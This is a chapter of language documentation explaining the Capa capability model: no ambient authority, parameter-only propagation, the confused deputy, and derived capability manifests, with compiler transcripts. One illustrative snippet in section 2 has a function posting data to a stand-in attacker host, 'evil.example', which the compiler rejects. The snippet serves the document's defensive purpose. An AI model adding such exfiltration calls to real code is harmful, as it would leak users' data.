# 10. The capability model

> **What this chapter covers.** How authority enters a Capa program and
> how it propagates: capabilities as unforgeable values; the absence of
> ambient authority (no global, `import`, constructor or literal
> produces a capability; the runtime hands all authority to `main`);
> the propagation discipline (parameter-only, no aliasing, no returning
> of built-ins, no fabrication); the elimination of the confused
> deputy; and the authority-chain-in-the-types property, verified
> against the manifest. The 10 concrete capabilities are in
> [11-builtin-capabilities.md](11-builtin-capabilities.md); attenuation
> in [12-attenuation.md](12-attenuation.md).

**Version documented.** `main` at commit `8e2c609` (`capa 1.32.0` plus
unreleased commits). Every transcript re-run at that commit on
2026-09-10, `python -m capa` importing the checkout under specification.

Depends on: [02-authority-in-types.md](02-authority-in-types.md).

---

## 1. Where authority enters: the runtime hands everything to `main`

A Capa program has no way to invoke an external effect (print, read a
file, open a socket, read the environment, run a process) except
through a **capability value** some function received. These values do
not appear in the middle of the program: they enter at a single point,
the entry point's signature. The runtime (the Python backend or the
Wasm host) constructs the capabilities `main` asks for, one per
parameter, and passes them in the startup call. From there on there is
only propagation: `main` decides who gets what.

`main` declares the capabilities it needs as parameters, and the
runtime materializes them:

```capa
// thread.capa
fun greet(stdio: Stdio, name: String)
    stdio.println("Hello, ${name}")

fun main(stdio: Stdio)
    greet(stdio, "Ana")
    greet(stdio, "Rui")
```

```
$ python -m capa --run thread.capa
Hello, Ana
Hello, Rui
$ python -m capa --run --wasm thread.capa
Hello, Ana
Hello, Rui
```

The two backends produce identical output. `main` received `Stdio` from
the runtime and propagated it to `greet` by explicit argument. There is
no other door: a capability `main` does not request in its signature is
never constructed.

## 2. There is no ambient authority

**Ambient authority** is any authority a function exercises without
having received it: a global `open`, an `import socket`, a constructor
that fabricates it. Capa has none of these doors.

- **No global produces it.** There is no capability in the global scope
  a leaf function could reach. A reference to a capability name that
  was not received is an `undefined name`.
- **No `import` produces it.** Importing a module brings functions and
  types, not authority; authority still has to flow by parameter (see
  [08-functions-closures-modules.md](08-functions-closures-modules.md)).
- **No constructor produces it.** A built-in capability is not a struct
  type: there is no `Stdio {}` literal that constructs it (see the
  `forge` example in
  [02-authority-in-types.md](02-authority-in-types.md)).

A leaf function that tries to use `net` without receiving it has no
environment to find it in:

```capa
// deputy_leak.capa
fun render(name: String) -> String
    net.post("http://evil.example/", name)
    return "Hello, ${name}"

fun main(stdio: Stdio)
    stdio.println(render("Ana"))
```

```
$ python -m capa --check deputy_leak.capa
deputy_leak.capa:3:5: error: undefined name 'net'
   3 |     net.post("http://evil.example/", name)
           ^

deputy_leak.capa: 1 error
```

`render` receives no `Net`, so the name `net` does not exist in its
body. The only way for `render` to open the network would be to declare
`net: Net` in its signature, and then the fact would be visible in
`render` and in every call chain up to `main`.

## 3. The propagation discipline

Authority moves in exactly one way: **passed as an argument**. Three
static rules close the alternative routes. All are enforced by the
analyzer at compile time (`--check`), not by a runtime monitor.

**(a) A capability cannot be aliased into a binding.** Copying a
capability into a `let`/`var` is refused; the capability keeps existing
only as a parameter, with no second name through which it could escape
the flow analysis.

```capa
// alias_cap.capa
fun main(fs: Fs, stdio: Stdio)
    let backdoor = fs
    stdio.println("aliased")
```

```
$ python -m capa --check alias_cap.capa
alias_cap.capa:3:5: error: capability 'Fs' cannot appear in a 'let' binding; capabilities only flow through function parameters
   3 |     let backdoor = fs
           ^

alias_cap.capa: 1 error
```

**(b) A built-in capability cannot be returned by a function.**
Built-in capabilities only flow "inward" (by parameter), never
"outward" (by return). This guarantees that the chain from `main` to
any capability value is a sequence of passings visible at every link,
with no hidden link where a regular function "produces" authority.

```capa
// return_cap.capa
fun grab(fs: Fs) -> Fs
    return fs

fun main(fs: Fs, stdio: Stdio)
    let f = grab(fs)
    stdio.println("got it")
```

```
$ python -m capa --check return_cap.capa
return_cap.capa:2:1: error: capability 'Fs' cannot appear in return type of function 'grab'; built-in capabilities only flow through function parameters
   2 | fun grab(fs: Fs) -> Fs
       ^

return_cap.capa: 1 error
```

The restriction is on **built-in** capabilities. A user-defined
capability can be returned by a factory (it is an ordinary Capa value
that wraps built-in authority in a field); see
[13-user-defined-capabilities.md](13-user-defined-capabilities.md).

**(c) A capability cannot be fabricated from data.** There is no
literal or constructor for a built-in capability (section 2 and the
`forge` example in [02](02-authority-in-types.md)). The only value of
type `Fs` in a program is the one that entered through `main` and was
passed on (or an attenuation of it, see
[12-attenuation.md](12-attenuation.md)).

JUDGEMENT. The three rules together give the central property: **the
authority a function can exercise is exactly what it receives in its
parameters**. There is no channel (global, import, constructor, alias,
return) through which unpassed authority enters. This is why a
function's signature is a provable upper bound on what it can do.

## 4. Eliminating the confused deputy

The **confused deputy** (Norm Hardy, 1988) is the pattern where a
privileged component is induced to use its authority on behalf of a
caller who should not have it. The root cause is ambient authority: the
deputy holds authority that comes not from the request but from the
environment, and cannot separate the legitimate request from the
abusive one.

In Capa the pattern disappears by construction. A component acts only
with the authority passed to it with the request; if the caller has no
`Fs`, it cannot pass `Fs`, and the deputy has no ambient `Fs` to use
instead. A function without capability parameters is, demonstrably,
pure with respect to external effects.

`render` computes a string and receives no capability; it can have no
external effects, and the compiler accepts it:

```capa
// deputy.capa
fun render(name: String) -> String
    return "Hello, ${name}"

fun main(stdio: Stdio)
    stdio.println(render("Ana"))
```

```
$ python -m capa --run deputy.capa
Hello, Ana
$ python -m capa --run --wasm deputy.capa
Hello, Ana
```

The two backends produce identical output. The version of `render` that
tries to abuse the network (`deputy_leak.capa`, section 2) does not
even compile. Authority and designation (the argument) are the same
thing, which is the definition of the object-capability property (see
[02-authority-in-types.md](02-authority-in-types.md)).

## 5. The authority chain in the types

Because authority lives in the types and flows only by parameter, the
compiler can **derive** (not declare) each function's authority surface
by reachability over the call chain. `--manifest` records, per
function, the capabilities declared in the signature, those
transitively reachable through the functions it calls, and the
**provably excluded** ones.

An excerpt of the manifest of `thread.capa` (section 1):

```
$ python -m capa --manifest thread.capa
...
      "name": "greet",
      "declared_capabilities": [ "Stdio" ],
      "transitively_reachable_capabilities": [ "Stdio" ],
      "provably_excluded_capabilities": [
        "Clock", "Db", "Env", "Fs", "Net", "Proc", "Random", "Serve", "Unsafe"
      ],
      "authority_provable_from_types": true,
      "ceiling_authority_provable": true,
...
```

`provably_excluded_capabilities` is the strong statement: the nine
capabilities `greet` **demonstrably does not reach**, derived from the
types and not from the author's word. `authority_provable_from_types:
true` signals that the whole surface is provable from the signatures.
This is the fact the supply-chain artefacts (SBOM, VEX, provenance)
carry; the complete envelope structure is in
[29-capability-manifest.md](29-capability-manifest.md).

## 6. What the model guarantees, and where it ends

- **Guarantees** (static, every program that passes `--check`): no
  function exercises authority it did not receive by parameter;
  authority cannot be aliased, returned (built-ins) or fabricated; the
  authority surface is derivable from the types. This is the core
  formalized in Agda (see [`proofs/README.md`](../proofs/README.md)).
- **Does not guarantee by itself** the integrity of the runtime that
  materializes the capabilities. On the Python backend the host is
  **trusted** (capabilities are Python objects). On the Wasm backend
  the boundary is the component's WASI import set, narrower, but the
  central model remains the type (see
  [23-wasi-and-runtime-attenuation.md](23-wasi-and-runtime-attenuation.md)).
- **It is orthogonal to IFC.** Capabilities answer "which effects can
  this function exercise", not "where can a sensitive value flow". That
  second question belongs to information-flow control, a distinct and
  complementary layer
  ([15-ifc-model-and-labels.md](15-ifc-model-and-labels.md) and
  [16-ifc-analyzer-and-tiers.md](16-ifc-analyzer-and-tiers.md)).

---

## Links

- [02-authority-in-types.md](02-authority-in-types.md): the theory
  (object-capabilities, POLA, confused deputy) and the prior art.
- [11-builtin-capabilities.md](11-builtin-capabilities.md): the 10
  concrete built-in capabilities and their methods.
- [12-attenuation.md](12-attenuation.md): deriving a strictly weaker
  version of a capability.
- [13-user-defined-capabilities.md](13-user-defined-capabilities.md):
  the implementor pattern that wraps built-in authority while keeping
  the chain readable.
- [29-capability-manifest.md](29-capability-manifest.md): from the
  model to the supply-chain artefact.
- [23-wasi-and-runtime-attenuation.md](23-wasi-and-runtime-attenuation.md):
  where capability materialization differs by backend.
